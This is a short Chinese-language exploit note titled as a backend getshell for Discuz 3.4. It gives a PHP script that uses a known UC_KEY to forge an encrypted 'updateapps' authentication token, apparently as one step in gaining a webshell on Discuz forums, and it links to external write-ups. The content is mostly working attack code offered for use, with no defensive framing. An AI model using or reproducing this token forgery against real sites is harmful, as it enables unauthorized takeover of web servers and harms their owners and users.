# Discuz 3.4 最新版后台getshell

详情可以看这篇文章：https://www.secpulse.com/archives/125869.html

最新版下载地址：https://gitee.com/Discuz/DiscuzX

```php
<?php
    $uc_key="123456";//
    $time = time() + 720000;
    $str = "time=".$time."&action=updateapps";
    $code = authcode($str,"ENCODE",$uc_key);
    $code = str_replace('+','%2b', $code) ;
    $code = str_replace('/','%2f', $code) ;
    echo "$code";
    function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;

    $key = md5($key != '' ? $key : '123456');
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
 
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
 
    $result = '';
    $box = range(0, 255);
 
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
 
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
 
    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
 
    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
                return '';
            }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
 
}
?>

```

![-w619](media/16215832926594/16215833292331.jpg)

ref：

https://forum.ywhack.com/thread-115312-1-8.html